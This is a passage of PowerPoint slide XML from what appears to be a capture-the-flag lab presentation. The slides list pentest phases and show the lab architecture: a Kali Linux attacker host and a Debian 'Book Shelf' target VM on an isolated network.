            <a:off x="6583680" y="4059936"/>
            <a:ext cx="365760" cy="347472"/>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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4059936"/>
            <a:ext cx="3840480" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="4361688"/>
            <a:ext cx="274320" cy="18288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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="4526280"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0B1220"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="4526280"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 131579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="4526280"/>
            <a:ext cx="365760" cy="347472"/>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6</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Text 35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4526280"/>
            <a:ext cx="3840480" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Initial Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="4828032"/>
            <a:ext cx="274320" cy="18288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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="4992624"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0B1220"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>7</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="4992624"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 131579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Text 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="4992624"/>
            <a:ext cx="365760" cy="347472"/>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7</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Text 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="4992624"/>
            <a:ext cx="3840480" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Post-Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="5294376"/>
            <a:ext cx="274320" cy="18288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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="5458968"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0B1220"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Shape 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="5458968"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 131579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Text 44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="5458968"/>
            <a:ext cx="365760" cy="347472"/>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8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Text 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="5458968"/>
            <a:ext cx="3840480" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Privilege Escalation Assessment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="5760720"/>
            <a:ext cx="274320" cy="18288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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Text 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="5925312"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0B1220"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>9</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Shape 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="5925312"/>
            <a:ext cx="365760" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 131579"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="38BDF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Text 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="5925312"/>
            <a:ext cx="365760" cy="347472"/>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9</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Text 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="5925312"/>
            <a:ext cx="3840480" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reporting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2</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01 · INTRODUCTION</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Lab Architecture</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2103120"/>
            <a:ext cx="3291840" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3636"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="38BDF8"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2331720"/>
            <a:ext cx="3291840" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>KALI LINUX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2651760"/>
            <a:ext cx="3291840" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker Host</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="3108960"/>
            <a:ext cx="329184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onsolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>192.168.76.128</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="3566160"/>
            <a:ext cx="3291840" cy="45720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Fully attacker-controlled</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>penetration testing toolkit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="3108960"/>
            <a:ext cx="3291840" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="38BDF8"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="2697480"/>
            <a:ext cx="3291840" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>VMware Isolated Lab Network</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="3246120"/>
            <a:ext cx="3291840" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>192.168.76.0/24</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7406640" y="2103120"/>
            <a:ext cx="3291840" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3636"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="EF4444"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7406640" y="2331720"/>
            <a:ext cx="3291840" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>BOOK-SHELF: 1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7406640" y="2651760"/>
            <a:ext cx="3291840" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Target VM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7406640" y="3108960"/>
            <a:ext cx="329184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onsolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>192.168.76.157</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7406640" y="3566160"/>
            <a:ext cx="3291840" cy="45720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Debian GNU/Linux 10 (buster)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Hosts the "Book Shelf" web app</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
